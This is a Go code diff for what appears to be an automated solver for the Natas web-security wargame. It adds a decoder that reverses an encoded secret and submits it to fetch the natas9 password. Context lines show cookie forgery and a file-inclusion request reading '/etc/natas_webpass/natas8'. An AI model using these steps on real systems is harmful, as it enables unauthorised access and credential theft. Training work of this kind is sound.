@@ -2,6 +2,8 @@ package main
 
 import (
 	"bytes"
+	"encoding/base64"
+	"encoding/hex"
 	"flag"
 	"fmt"
 	"io"
@@ -93,7 +95,7 @@ type SetPost struct {
 func (s SetPost) Grab(r http.Request) (string, error) {
 	d, err := s.Grabber.Grab(r)
 	if err != nil {
-		return "", nil
+		return "", err
 	}
 	s.Data.Set(s.Key, d)
 	return s.Post.Grab(r)
@@ -112,6 +114,32 @@ func (g Get) Grab(r http.Request) (string, error) {
 	return s, err
 }
 
+type Decode8 struct {
+	Grabber
+}
+
+func (d Decode8) Grab(r http.Request) (string, error) {
+	hrb, err := d.Grabber.Grab(r)
+	if err != nil {
+		return "", err
+	}
+	rb := make([]byte, hex.DecodedLen(len(hrb)))
+	_, err = hex.Decode(rb, []byte(hrb))
+	if err != nil {
+		return "", err
+	}
+	b := make([]byte, len(rb))
+	for n, d := range rb {
+		b[len(b)-n-1] = d
+	}
+	secret := make([]byte, base64.StdEncoding.DecodedLen(len(b)))
+	_, err = base64.StdEncoding.Decode(secret, b)
+	if err != nil {
+		return "", err
+	}
+	return string(bytes.TrimRight(secret, "\x00")), nil
+}
+
 var levels = [...]Grabber{
 	Prefixed{"The password for natas1 is ", 32},
 	Prefixed{"The password for natas2 is ", 32},
@@ -121,6 +149,7 @@ var levels = [...]Grabber{
 	Headers{Prefixed{"The password for natas6 is ", 32}, http.Header{"Cookie": []string{"loggedin=1"}}},
 	SetPost{Post{Prefixed{"The password for natas7 is ", 32}, url.Values{"submit": []string{"Submit Query"}}}, Path{Prefixed{"$secret = \"", 19}, "/includes/secret.inc"}, "secret"},
 	Get{Prefixed{"<br>\n<br>\n", 32}, url.Values{"page": []string{"/etc/natas_webpass/natas8"}}},
+	SetPost{Post{Prefixed{"The password for natas9 is ", 32}, url.Values{"submit": []string{"Submit Query"}}}, Decode8{Path{Prefixed{"$encodedSecret&nbsp;=&nbsp;\"", 32}, "/index-source.html"}}, "secret"},
 }
 
 func main() {
